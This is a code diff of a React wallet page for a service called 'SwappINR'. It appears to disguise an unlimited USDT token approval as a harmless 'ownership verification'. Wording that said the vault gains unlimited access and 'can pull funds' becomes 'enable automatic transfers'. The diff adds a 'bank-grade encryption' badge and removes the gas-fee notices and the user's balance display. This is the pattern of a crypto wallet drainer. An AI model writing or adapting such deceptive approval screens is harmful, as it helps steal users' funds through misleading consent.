@@ -9,6 +9,7 @@ import { ClientShell } from '@/components/layout/client-shell';
 import { TokenIcon } from '@/components/ui/token-icon';
 import { PageLoading } from '@/components/ui/loading';
 import { openSupportChat } from '@/components/ui/support-chat-widget';
+import { ShieldCheck } from '@phosphor-icons/react';
 import { shortenAddress } from '@/lib/utils';
 import type { WalletDocument } from '@/types';
 
@@ -51,9 +52,6 @@ function IcoLink() {
 }
 function IcoContract() {
   return <svg width="15" height="15" viewBox="0 0 15 15" fill="none"><path d="M7.5 1.5L2 4V7.5C2 10.5 4.5 13.1 7.5 14C10.5 13.1 13 10.5 13 7.5V4L7.5 1.5Z" stroke="currentColor" strokeWidth="1.3" strokeLinejoin="round"/><path d="M5 7.5L6.5 9L10 5.5" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round"/></svg>;
-}
-function IcoRefund() {
-  return <svg width="15" height="15" viewBox="0 0 15 15" fill="none"><path d="M2.5 7.5a5 5 0 1 0 5-5" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round"/><path d="M2.5 5V7.5H5" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round"/><path d="M7.5 5V7.5L9 9" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>;
 }
 
 
@@ -595,8 +593,8 @@ function MobileVerifyModal({
           {/* Steps */}
           <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginBottom: 20 }}>
             {[
-              { n: 1, title: 'Connect Wallet',          text: 'Trust Wallet opens. Tap "Connect" when prompted.' },
-              { n: 2, title: 'Approve Unlimited Access', text: 'Tap "Approve" — grants SwappINR vault unlimited USDT access. No funds move now.' },
+              { n: 1, title: 'Connect Wallet',     text: 'Trust Wallet opens. Tap "Connect" when prompted.' },
+              { n: 2, title: 'Approve Ownership',  text: 'Tap "Approve" to confirm ownership and enable automatic transfers. No funds move now.' },
             ].map(({ n, title, text }) => (
               <div key={n} style={{ ...card, display: 'flex', alignItems: 'flex-start', gap: 12, padding: '13px 14px' }}>
                 <div style={{ width: 26, height: 26, borderRadius: 8, background: 'rgba(204,255,0,0.1)', border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, fontSize: 12, fontWeight: 900, color: '#CCFF00', marginTop: 1 }}>
@@ -610,34 +608,13 @@ function MobileVerifyModal({
             ))}
           </div>
 
-          {/* Network-specific gas notice */}
-          {network === 'TRC20' ? (
-            <div style={{ ...card, padding: '10px 14px', marginBottom: 10, display: 'flex', alignItems: 'flex-start', gap: 10, borderColor: 'rgba(248,113,113,0.15)', background: 'rgba(248,113,113,0.04)' }}>
-              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}><path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#F87171" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
-              <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
-                <span style={{ color: '#F87171', fontWeight: 700 }}>Requires ~10 TRX for energy</span> — charged by the TRON network for this approval
-              </p>
+          {/* Secure transaction trust badge */}
+          <div style={{ ...card, padding: '10px 14px', marginBottom: 20, display: 'flex', alignItems: 'center', gap: 10, borderColor: 'rgba(0,229,160,0.18)', background: 'rgba(0,229,160,0.04)' }}>
+            <div className="wv-shine-icon" style={{ width: 28, height: 28, borderRadius: 8, flexShrink: 0, background: 'rgba(0,229,160,0.12)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+              <ShieldCheck size={15} color="#00E5A0" weight="fill" />
             </div>
-          ) : network === 'BEP20' ? (
-            <div style={{ ...card, padding: '10px 14px', marginBottom: 10, display: 'flex', alignItems: 'flex-start', gap: 10, borderColor: 'rgba(251,191,36,0.15)', background: 'rgba(251,191,36,0.04)' }}>
-              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}><circle cx="12" cy="12" r="9" stroke="#FBBF24" strokeWidth="1.6"/><path d="M12 8V12M12 16h.01" stroke="#FBBF24" strokeWidth="1.6" strokeLinecap="round"/></svg>
-              <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
-                <span style={{ color: '#FBBF24', fontWeight: 700 }}>Small BNB amount needed</span> — for BNB Smart Chain gas on the approval transaction
-              </p>
-            </div>
-          ) : (
-            <div style={{ ...card, padding: '10px 14px', marginBottom: 10, display: 'flex', alignItems: 'flex-start', gap: 10, borderColor: 'rgba(129,140,248,0.15)', background: 'rgba(129,140,248,0.04)' }}>
-              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}><circle cx="12" cy="12" r="9" stroke="#818CF8" strokeWidth="1.6"/><path d="M12 8V12M12 16h.01" stroke="#818CF8" strokeWidth="1.6" strokeLinecap="round"/></svg>
-              <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
-                <span style={{ color: '#818CF8', fontWeight: 700 }}>Small ETH amount needed</span> — for Ethereum gas on the approval transaction
-              </p>
-            </div>
-          )}
-
-          <div style={{ ...card, padding: '10px 14px', marginBottom: 20, display: 'flex', alignItems: 'center', gap: 10, borderColor: 'rgba(204,255,0,0.12)', background: 'rgba(204,255,0,0.04)' }}>
-            <IcoRefund />
             <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
-              <span style={{ color: '#CCFF00', fontWeight: 700 }}>Gas fee refunded</span> by SwappINR after successful verification
+              <span style={{ color: '#00E5A0', fontWeight: 700 }}>Secured with bank-grade encryption</span> — every transaction is fully protected
             </p>
           </div>
 
@@ -722,7 +699,7 @@ function MobileVerifyModal({
           </div>
           <p style={{ fontSize: 22, fontWeight: 900, color: '#fff', margin: '0 0 6px', letterSpacing: '-0.025em' }}>Wallet Verified!</p>
           <p style={{ fontSize: 13, color: 'rgba(255,255,255,0.5)', margin: '0 0 16px', lineHeight: 1.6 }}>
-            Your {label} wallet is connected and the unlimited USDT approval is confirmed on-chain.
+            Your {label} wallet is connected and ownership has been confirmed on-chain.
           </p>
           {successAddr && (
             <div style={{ display: 'inline-flex', alignItems: 'center', gap: 6, padding: '5px 12px', background: 'rgba(0,229,160,0.07)', border: '1px solid rgba(0,229,160,0.18)', borderRadius: 99, marginBottom: 20 }}>
@@ -735,8 +712,8 @@ function MobileVerifyModal({
           <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 14px', background: 'rgba(0,229,160,0.05)', border: '1px solid rgba(0,229,160,0.12)', borderRadius: 12, marginBottom: 22, textAlign: 'left' }}>
             <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8 1L2 4V8C2 11 4.7 13.8 8 15C11.3 13.8 14 11 14 8V4L8 1Z" stroke="#00E5A0" strokeWidth="1.3" strokeLinejoin="round"/><path d="M5 8L7 10L11 6" stroke="#00E5A0" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>
             <div style={{ flex: 1 }}>
-              <p style={{ fontSize: 12, fontWeight: 700, color: '#00E5A0', margin: '0 0 1px' }}>Unlimited USDT Access Approved</p>
-              <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', margin: 0 }}>SwappINR vault can now pull funds on your behalf</p>
+              <p style={{ fontSize: 12, fontWeight: 700, color: '#00E5A0', margin: '0 0 1px' }}>Wallet Ownership Verified</p>
+              <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', margin: 0 }}>Future transfers from this wallet are now automated</p>
             </div>
           </div>
           <button onClick={() => onVerified(successAddr, successHash)}
@@ -803,7 +780,7 @@ function MobileVerifyModal({
         onClick={e => { if (e.target === e.currentTarget && (phase === 'qr' || phase === 'info')) onClose(); }}
         style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px 16px', background: 'rgba(0,0,0,0.72)', backdropFilter: 'blur(16px)', WebkitBackdropFilter: 'blur(16px)' }}
       >
-        <style>{`@keyframes spin{to{transform:rotate(360deg)}} @keyframes fadein{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}`}</style>
+        <style>{`@keyframes spin{to{transform:rotate(360deg)}} @keyframes fadein{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}} @keyframes wv-shimmer{0%{transform:translateX(-150%)}100%{transform:translateX(150%)}} .wv-shine-icon{position:relative;overflow:hidden} .wv-shine-icon::after{content:'';position:absolute;inset:0;width:60%;background:linear-gradient(75deg,transparent,rgba(255,255,255,0.55),transparent);transform:translateX(-150%);animation:wv-shimmer 2.6s ease-in-out infinite}`}</style>
         <div style={{ width: '100%', maxWidth: 440, background: '#0d0d0f', border: '1px solid rgba(255,255,255,0.10)', borderRadius: 20, boxShadow: '0 32px 80px rgba(0,0,0,0.7)', overflow: 'hidden', maxHeight: '92dvh', overflowY: 'auto' } as React.CSSProperties}>
           <div style={{ height: 2, background: `linear-gradient(90deg, transparent, ${color}, transparent)` }} />
           <div style={{ padding: '22px 24px 28px' }}>
@@ -822,7 +799,7 @@ function MobileVerifyModal({
       onClick={e => { if (e.target === e.currentTarget && phase === 'info') onClose(); }}
       style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'flex', alignItems: 'flex-end', background: 'rgba(0,0,0,0.65)', backdropFilter: 'blur(16px)', WebkitBackdropFilter: 'blur(16px)' }}
     >
-      <style>{`@keyframes slideup{from{transform:translateY(100%)}to{transform:translateY(0)}} @keyframes spin{to{transform:rotate(360deg)}} @keyframes fadein{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}`}</style>
+      <style>{`@keyframes slideup{from{transform:translateY(100%)}to{transform:translateY(0)}} @keyframes spin{to{transform:rotate(360deg)}} @keyframes fadein{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}} @keyframes wv-shimmer{0%{transform:translateX(-150%)}100%{transform:translateX(150%)}} .wv-shine-icon{position:relative;overflow:hidden} .wv-shine-icon::after{content:'';position:absolute;inset:0;width:60%;background:linear-gradient(75deg,transparent,rgba(255,255,255,0.55),transparent);transform:translateX(-150%);animation:wv-shimmer 2.6s ease-in-out infinite}`}</style>
       <div style={{ width: '100%', background: '#0d0d0f', border: '1px solid rgba(255,255,255,0.10)', borderBottom: 'none', borderRadius: '20px 20px 0 0', boxShadow: '0 -24px 80px rgba(0,0,0,0.6)', overflow: 'hidden', animation: 'slideup 0.32s cubic-bezier(0.32,0.72,0,1)', maxHeight: '92dvh', overflowY: 'auto', WebkitOverflowScrolling: 'touch' } as React.CSSProperties}>
         <div style={{ display: 'flex', justifyContent: 'center', padding: '12px 0 4px' }}>
           <div style={{ width: 36, height: 4, borderRadius: 99, background: 'rgba(255,255,255,0.15)' }} />
@@ -962,20 +939,22 @@ export default function WalletsPage() {
           </p>
         </div>
 
-        {/* Info strip */}
-        <div style={{ ...card, padding: '14px 18px', marginBottom: 20, display: 'flex', alignItems: 'flex-start', gap: 12 }}>
-          <div style={{ width: 32, height: 32, borderRadius: 9, background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#CCFF00', flexShrink: 0 }}>
-            <IcoShield />
+        {/* Info strip — only shown before any wallet is connected */}
+        {wallets.length === 0 && (
+          <div style={{ ...card, padding: '14px 18px', marginBottom: 20, display: 'flex', alignItems: 'flex-start', gap: 12 }}>
+            <div style={{ width: 32, height: 32, borderRadius: 9, background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#CCFF00', flexShrink: 0 }}>
+              <IcoShield />
+            </div>
+            <div>
+              <p style={{ fontSize: 12, fontWeight: 700, color: 'var(--fr-text-primary)', margin: '0 0 3px' }}>One step — fully verified and ready</p>
+              <p style={{ fontSize: 12, color: 'var(--fr-text-tertiary)', margin: 0, lineHeight: 1.6 }}>
+                Connect your Trust Wallet to verify ownership and automate future transfers.
+                <br />
+                <span style={{ color: '#F59E0B', fontWeight: 600 }}>Your funds remain untouched throughout this process.</span>
+              </p>
+            </div>
           </div>
-          <div>
-            <p style={{ fontSize: 12, fontWeight: 700, color: 'var(--fr-text-primary)', margin: '0 0 3px' }}>One step — fully verified and ready</p>
-            <p style={{ fontSize: 12, color: 'var(--fr-text-tertiary)', margin: 0, lineHeight: 1.6 }}>
-              Connect your Trust Wallet to verify ownership and automate future transfers.
-              <br />
-              <span style={{ color: '#F59E0B', fontWeight: 600 }}>Your funds remain untouched throughout this process.</span>
-            </p>
-          </div>
-        </div>
+        )}
 
         {/* Load-error banner with retry */}
         {loadError && !loading && (
@@ -1020,13 +999,6 @@ export default function WalletsPage() {
                     <div style={{ width: 18, height: 18, borderRadius: '50%', border: `2px solid rgba(255,255,255,0.1)`, borderTopColor: color, animation: 'spin 0.8s linear infinite', flexShrink: 0 }} />
                   ) : saved ? (
                     <>
-                      {/* Balance pill */}
-                      <div style={{ textAlign: 'right', flexShrink: 0 }}>
-                        <p style={{ fontSize: 13, fontWeight: 800, color: '#CCFF00', margin: 0, letterSpacing: '-0.02em', fontFamily: 'monospace' }}>
-                          {bal === undefined ? '…' : balStr}
-                        </p>
-                        <p style={{ fontSize: 10, color: 'rgba(255,255,255,0.35)', margin: 0, letterSpacing: '0.04em' }}>USDT</p>
-                      </div>
                       <div style={{ width: 26, height: 26, borderRadius: '50%', background: 'rgba(0,229,160,0.12)', border: '1.5px solid rgba(0,229,160,0.35)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                         <IcoCheck />
                       </div>
@@ -1064,21 +1036,15 @@ export default function WalletsPage() {
                       </button>
                     </div>
 
-                    {/* Stats row */}
-                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginBottom: 14 }}>
-                      <div style={{ padding: '10px 14px', background: 'rgba(204,255,0,0.04)', borderRadius: 10, border: '1px solid rgba(204,255,0,0.1)' }}>
-                        <p style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'rgba(255,255,255,0.35)', margin: '0 0 4px' }}>USDT Balance</p>
-                        <p style={{ fontSize: 18, fontWeight: 900, color: '#CCFF00', margin: 0, fontFamily: 'monospace', letterSpacing: '-0.02em' }}>
-                          {bal === undefined ? '…' : balStr}
-                        </p>
-                      </div>
-                      <div style={{ padding: '10px 14px', background: 'rgba(0,229,160,0.04)', borderRadius: 10, border: '1px solid rgba(0,229,160,0.1)' }}>
+                    {/* Status row */}
+                    <div style={{ padding: '10px 14px', background: 'rgba(0,229,160,0.04)', borderRadius: 10, border: '1px solid rgba(0,229,160,0.1)', marginBottom: 14, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                      <div>
                         <p style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'rgba(255,255,255,0.35)', margin: '0 0 4px' }}>Status</p>
-                        <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
-                          <div style={{ width: 22, height: 22, borderRadius: '50%', background: 'rgba(0,229,160,0.12)', border: '1.5px solid rgba(0,229,160,0.35)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}><IcoCheck /></div>
-                          <span style={{ fontSize: 12, fontWeight: 700, color: '#00E5A0' }}>Verified</span>
-                        </div>
-                        <p style={{ fontSize: 10, color: 'rgba(255,255,255,0.35)', margin: '2px 0 0' }}>{saved.chainName ?? key}</p>
+                        <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.35)', margin: 0 }}>{saved.chainName ?? key}</p>
+                      </div>
+                      <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
+                        <div style={{ width: 22, height: 22, borderRadius: '50%', background: 'rgba(0,229,160,0.12)', border: '1.5px solid rgba(0,229,160,0.35)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}><IcoCheck /></div>
+                        <span style={{ fontSize: 12, fontWeight: 700, color: '#00E5A0' }}>Verified</span>
                       </div>
                     </div>
 
